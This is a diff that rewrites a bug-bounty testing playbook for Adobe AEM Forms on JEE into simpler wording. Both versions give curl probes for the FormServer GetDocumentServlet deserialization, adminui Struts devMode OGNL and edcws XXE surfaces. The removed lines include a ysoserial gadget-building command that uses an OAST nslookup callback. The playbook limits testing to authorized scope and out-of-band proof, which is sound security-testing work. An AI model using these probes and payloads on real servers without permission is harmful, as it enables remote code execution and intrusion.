@@ -1,42 +1,48 @@
-# Batch 14 — AEM Forms modern criticals (Shah / Assetnote)
+# Batch 14 — Forms new big bugs (Shah / Assetnote)
 
-## objective
+## GOAL
+On standalone Forms, check modern unauth critical doors. **OOB first.** Only if RCE/XXE allowed.
 
-On **standalone Forms JEE** smells, check modern unauth critical surfaces: FormServer deserialization, adminui/Struts-devMode class issues, web-service XXE.  
-**Strict scope:** only if RCE/XXE allowed. Prefer DNS/HTTP OOB first.
+## TIME
+~1–2 hours
 
-## estimated_time
+## YOU NEED
+- Batch 12: standalone smell  
+- OAST  
+- RCE in scope  
 
-60–120 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 12 classified standalone (or strong FormServer/adminui)
-- OAST
-- Patch status unknown is OK — still test carefully
+2025 research: standalone Forms on JEE left doors like:
 
-## testing_workflow
+1. **GetDocumentServlet** — bad Java deserialize (`serDoc`) → command run  
+2. **adminui** + Struts **devMode** left on → code eval after auth filter fail  
+3. Web service **XXE**
 
-### 1) Technique A — FormServer GetDocumentServlet presence
+Internet-facing Forms is often “forgot this is critical.” You check doors, then prove with DNS ping to yourself — not disk wipe.
 
-```bash
-T="https://TARGET"
-curl -sk -D- -o /tmp/fs -w "%{http_code}\n" \
-  "$T/FormServer/servlet/GetDocumentServlet"
-head -c 300 /tmp/fs; echo
-```
+---
 
-If endpoint lives, **deser RCE** research path uses `serDoc` = gzip+base64 java gadget (ysoserial).  
-Lab-only generation sketch:
+## DO THIS
 
 ```bash
-# Authorized lab only — use OOB command
-# java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "nslookup YOUR-OAST" | gzip | base64 -w0
+T="https://PUT-THE-SITE-HERE"
 ```
 
-Send as `serDoc` query param URL-encoded. **Do not** run destructive commands.
+### 1) Is FormServer servlet there?
 
-### 2) Technique B — adminui reachability
+```bash
+curl -sk -D- -o /tmp/fs -w "code:%{http_code}\n" \
+  "$T/FormServer/servlet/GetDocumentServlet" | head -20
+head -c 200 /tmp/fs; echo
+```
+
+If live and RCE allowed: build gadget offline (ysoserial + gzip + base64), send as `serDoc=`.  
+Use **nslookup YOUR-OAST** style command only. See `reference/08` for research notes.
+
+### 2) adminui open?
 
 ```bash
 for p in /adminui/ /adminui/login.do /adminui/debug; do
@@ -44,28 +50,27 @@ for p in /adminui/ /adminui/login.do /adminui/debug; do
 done
 ```
 
-Historical issue class: auth filter bypass + `struts.devMode=true` → OGNL.  
-If unauth debug/OGNL endpoints respond, stop and document with minimal PoC per program rules.
+Unauth debug/OGNL-looking responses = stop and document carefully.
 
-### 3) Technique C — edcws / web services XXE (OOB only first)
+### 3) edcws present?
 
 ```bash
-curl -sk "$T/edcws/" | head -c 400
-# Enumerate listed services; send OOB XXE only, no huge file exfil
+curl -sk "$T/edcws/" | head -c 400; echo
 ```
 
-## decision_points
+XXE tests = OOB entity to YOUR-OAST only in this pass.
 
-| If… | Then… |
-|-----|--------|
-| RCE proven OOB | Critical report; stop further noise |
-| Endpoints exposed, exploit fails (patched) | Report attack surface + version advice |
-| Not standalone | You should not be in this batch — go **15** |
+---
 
-## expected_findings
+## IF / THEN
 
-- Pre-auth RCE, XXE, critical misconfig on internet-facing Forms
+| What you saw | What you do |
+|--------------|-------------|
+| OOB RCE | Critical report. Stop noisy testing |
+| Doors open, exploit fails | Report exposure + “patch Forms” |
+| Not standalone | You should not be here → **15** |
 
-## next_batch_to_continue_with
+---
 
-→ **[15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)** (Sites/modern AEM track)
+## NEXT
+→ [15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)
